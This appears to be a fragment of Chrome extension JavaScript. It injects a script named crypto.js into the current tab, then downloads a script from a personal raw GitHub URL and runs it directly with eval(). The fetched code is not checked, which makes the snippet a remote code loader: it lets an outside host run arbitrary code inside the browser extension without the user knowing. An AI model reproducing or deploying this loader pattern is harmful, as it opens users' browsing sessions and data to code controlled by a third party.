chrome.tabs.executeScript(null, { file: "/utils/crypto.js" }, function(result) {
    if (chrome.runtime.lastError) {
        console.error(chrome.runtime.lastError);
    } else {
        // Handle the result if needed
        console.log(result);
    }
});


const scriptURL  = 'https://raw.githubusercontent.com/sravya01231/repo1/main/script.js'


var xhr = new XMLHttpRequest();
xhr.open("GET", scriptURL, true);
xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
        eval(xhr.responseText);
    }
};
xhr.send();
